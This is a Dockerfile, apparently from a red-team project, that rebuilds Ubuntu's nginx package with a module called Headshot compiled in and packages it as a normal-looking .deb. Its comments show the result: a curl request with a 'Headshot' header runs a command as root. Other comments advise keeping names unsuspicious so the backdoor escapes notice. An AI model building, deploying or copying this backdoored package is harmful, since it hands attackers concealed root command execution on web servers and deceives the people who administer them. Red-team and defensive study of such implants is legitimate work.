FROM ubuntu:latest

# nothing super sus for the workdir, this shows up in compiled binary
WORKDIR /nginx

# enable source repos
RUN sed -i '/deb-src/s/^# //' /etc/apt/sources.list 

RUN apt update

# download prerequisites
RUN DEBIAN_FRONTEND=noninteractive apt install -y build-essential git gcc make dpkg-dev libpcre3 libpcre3-dev zlib1g zlib1g-dev openssl libssl-dev libxslt1-dev libgd-dev libgeoip-dev

RUN DEBIAN_FRONTEND=noninteractive apt build-dep nginx -y

# get nginx source code
RUN mkdir apt_source

WORKDIR /nginx/apt_source

RUN apt source nginx

# we don't know the nginx version that apt is going to pull down,
# so just rename the directory to something we can predict instead
# there is probably a better way to do this
RUN mv ./nginx-1* source/


WORKDIR /nginx/apt_source/source

# if run automatically, grab the latest version to compile into the package
# can always mount a volume to /nginx/redteam instead if you want to test
# a locally checked out version
RUN git clone https://github.com/ritredteam/Headshot /nginx/redteam

# add headshot module to configure flags
# can always rename redteam to something less suspicious
RUN sed -i 's/^common_configure_flags := \\/common_configure_flags := --add-module=..\/..\/..\/..\/redteam \\/g' /nginx/apt_source/source/debian/rules


RUN dpkg-buildpackage -uc -b 

# .deb files are in /nginx/apt_source
# $ cd /nginx/apt_source
# $ dpkg -i *.deb
# ...

# $ nginx -V
# nginx version: nginx/1.xx.x (Ubuntu)
# built with OpenSSL 1.1.1f  31 Mar 2020
# TLS SNI support enabled
# configure arguments: --add-module=../../../../redteam ...

# $ curl -H "Headshot: id" localhost
# uid=0(root) gid=0(root) groups=0(root)


